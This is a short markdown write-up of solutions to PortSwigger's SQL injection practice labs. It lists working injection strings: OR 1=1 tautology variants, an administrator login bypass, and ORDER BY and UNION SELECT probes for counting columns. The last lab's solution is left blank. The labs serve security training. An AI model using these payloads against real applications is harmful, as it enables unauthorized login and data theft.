# SQL-injection
# Port Swigger SQL injection Labs Solutions <tag>

<h3>- Retrieving hidden data</h3>

[1.Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)


1. *Solutions*
   1. `'+OR+1=1--` -> Required
   >The server can also respond for the following
   1. `'OR+'1'='1--`
   1. `'OR+'1'='1'--`
   1. `'OR+'1'--`
   1. `'OR+true--`
   1. `'OR+'a'='a'--`
   1. `/OR+1=1--`
   1. `)'OR+1=1-- `
   1. `""OR+1=1--`
   1. `)*OR+1=1--`
   
<h3>- Subverting application logic</h3>

[2.Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

1. *Solutions*
   1. username : `administrator'--` password : `''`
   1. username :`a'OR+1=1--`        password : `''`
  
<h3>- Retrieving data from other database tables</h3>

[3.Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

1. *Solutions*
   >The first step of such an attack is to determine the number of columns that are being returned by the query.
   >The server will responed for `'ORDER+BY+1--` `'ORDER+BY+2--` `'ORDER+BY+3--` that mean there are 3 columns in the database.
   
   1. `'+UNION+SELECT+NULL,NULL,NULL-- `
   1. `'UNION+SELECT+NULL,NULL,NULL--`
   1. `'union+select+null,null,null--`
   
[4.Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

1. *Solutions*
   1. 



